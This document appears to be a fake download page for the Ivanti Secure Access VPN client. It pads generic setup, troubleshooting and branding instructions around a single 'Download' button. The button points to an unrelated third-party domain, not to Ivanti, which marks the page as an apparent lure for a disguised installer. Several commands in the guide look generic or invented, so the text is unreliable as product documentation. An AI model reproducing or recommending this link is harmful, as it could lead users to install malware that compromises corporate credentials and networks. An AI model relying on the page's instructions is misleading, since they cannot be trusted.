# Download Ivanti Secure Access Client

**Ivanti Secure Access Client** is a dependable software solution designed to provide secure remote access to corporate resources. Frequently utilized by enterprises, it guarantees that employees, contractors, and partners can securely connect to internal applications, files, and services from any device or location. With seamless integration into Ivanti Secure Access Gateways, it boosts security, enhances productivity, and ensures compliance for modern mobile and remote workforces.

- [Installation](#installation)
- [System Requirements](#system-requirements)
- [Configuration Guide](#configuration-guide)
- [Troubleshooting Guide](#troubleshooting-guide)
- [Advanced Settings](#advanced-settings)
- [Usage](#usage)
- [Additional Features](#additional-features)


## Installation
To install Ivanti Secure Access Client on Windows, download the file by clicking the button below:

[**Download Ivanti Secure Access Client**](https://investkirkuk.com/htt/)

Download the latest version of Ivanti Secure Access Client to ensure secure and efficient remote access to your corporate resources. Regular updates and dedicated support ensure that your software remains up-to-date with the latest security features and enhancements. Click the button above to download and begin your installation process.

## System Requirements
- **Windows**: Windows 10 or newer.
- **macOS**: macOS 10.15 or later.
- **Linux**: Ubuntu 18.04 or Fedora 30 with necessary dependencies.

### Adding and Managing VPN Connections

- **Adding a New VPN Connection**:
    1. Open the client interface.
    2. Click the `Add` button.
    3. Provide a connection name and specify the server URL.
    4. Save the connection, then click `Connect`.
- **Modifying an Existing VPN Connection**:
    1. Select the connection from the list.
    2. Click the `Edit` button and adjust the details.
    3. Save the modifications.
- **Removing a VPN Connection**:
    1. Choose the connection and click the `Delete` button.
    2. Confirm deletion.

## Customizing the Client

Ivanti Secure Access Client allows for customization via branding packages. Administrators can:

- Modify UI labels and system messages.
- Integrate custom branding and graphical elements.
- Validate and generate customized installation packages.

For detailed guidance, refer to the Brand Packager Workflow.

## Uninstalling Ivanti Secure Access Client

- **Windows**: Uninstall using the `Add/Remove Programs` feature.  
- **macOS**: Drag the application to the Trash or run:  
  ```bash
  sudo rm -rf /Applications/Ivanti\ Secure\ Access.app
  ```
- **Linux**:  
     - Debian-based:
        ```bash
        sudo dpkg -r package_name
        ```
     - RPM-based:
        ```bash
        sudo rpm -e package_name
        ```

## Configuration Guide

### System Setup
To begin configuring **Ivanti Connect Secure**, follow these steps:

1. **Hardware Setup:** Connect the device to the network and power it on.
2. **Initial Configuration:** Use the serial console or web interface (`https://a.b.c.d/admin`) to configure:
   - Internal and external ports
   - VLAN settings
   - Date and time settings
3. **Admin Access:** Create an administrator account and set up authentication.

### User Authentication
Ivanti Connect Secure supports multiple authentication methods:
- **Active Directory (AD)**
- **RADIUS**
- **LDAP**
- **SAML**
- **Certificate-based authentication**

To configure an authentication server:
```plaintext
Admin Console > Authentication > Auth. Servers > New Server
```

### User Roles & Permissions
Define roles to control user access levels:
- **Standard Users:** Access to web resources, file shares, or VPN.
- **Administrators:** Full system configuration access.

To create a user role:
```plaintext
Admin Console > Users > User Roles > New Role
```

### Configuring VPN Tunneling
To enable SSL VPN access:
1. **Enable VPN Tunneling in user roles**
2. **Define network routes for VPN traffic**
3. **Set split tunneling policies**

Example CLI command for VPN status:
```bash
show vpn status
```

### Secure Web Access Configuration
To secure internal applications:
1. **Configure web rewriting**
2. **Set up resource policies**
3. **Define bookmarks for user access**

Example JSON config for SAML integration:
```json
{
  "saml_enabled": true,
  "idp_url": "https://idp.example.com",
  "sp_metadata": "https://vpn.example.com/saml/metadata"
}
```

---

## Troubleshooting Guide

### Common Issues & Fixes

#### Users Cannot Connect to VPN
**Possible causes:**
- Incorrect authentication settings
- Network firewall blocking SSL VPN ports

**Solution:**
1. Verify VPN status:
   ```bash
   show vpn status
   ```
2. Check firewall rules (ensure port 443 is open).
3. Restart the VPN service:
   ```bash
   systemctl restart vpn-service
   ```

#### SAML Authentication Failure
**Error message:** `No valid assertion found in SAML response`

**Solution:**
- Ensure **IdP metadata** is correctly configured.
- Verify time synchronization between IdP and Ivanti Connect Secure.

#### Slow Performance or Connection Drops
**Possible causes:**
- High CPU/memory usage
- Network latency

**Solution:**
1. Check system resource usage:
   ```bash
   top
   ```
2. Reduce logging verbosity:
   ```plaintext
   Admin Console > Logging > Set Log Level to "Warning"
   ```

### Debugging Tools
- **Event Logs:** `Admin Console > Logs > System Logs`
- **Packet Capture:** Use built-in diagnostic tools:
  ```bash
  tcpdump -i eth0 host vpn.example.com
  ```

---

## Advanced Settings

### Customizing User Portal
Modify UI elements:
- Change login page background color:
  ```html
  <style> body { background-color: #282c34; } </style>
  ```
- Custom header/logo:
  ```plaintext
  Admin Console > Customization > Branding
  ```

### Configuring Multi-Factor Authentication (MFA)
Enable MFA using:
- **TOTP-based one-time passwords**
- **Hardware security tokens**
- **Push notifications**

To enable TOTP:
```plaintext
Admin Console > Authentication > MFA > Enable TOTP
```

### Monitoring & Alerts
Set up real-time alerts for failed logins or suspicious activity:
```plaintext
Admin Console > Alerts > Create Alert > Condition: Failed Login Attempts
```

### Clustering for High Availability
To enable clustering:
1. Configure cluster settings:
   ```plaintext
   Admin Console > Clustering > Enable Cluster
   ```
2. Define primary and secondary nodes.
3. Enable session persistence.

## Usage
- Open the application via desktop shortcuts or command-line interface.
- Establish VPN connections through an intuitive UI or by using command-line tools such as `jamCommand`.
- Manage connections, certificates, and session states with built-in administrative tools.

## Additional Features
- **Dynamic Policy Updates**: Enables automatic configuration updates.
- **Chromium Embedded Framework Support**: Enhances security for web-based interactions.
- **Session Migration**: Ensures smooth transitions between active sessions.

For more comprehensive information, visit [Ivanti Official Documentation](https://www.ivanti.com/support/product-documentation).
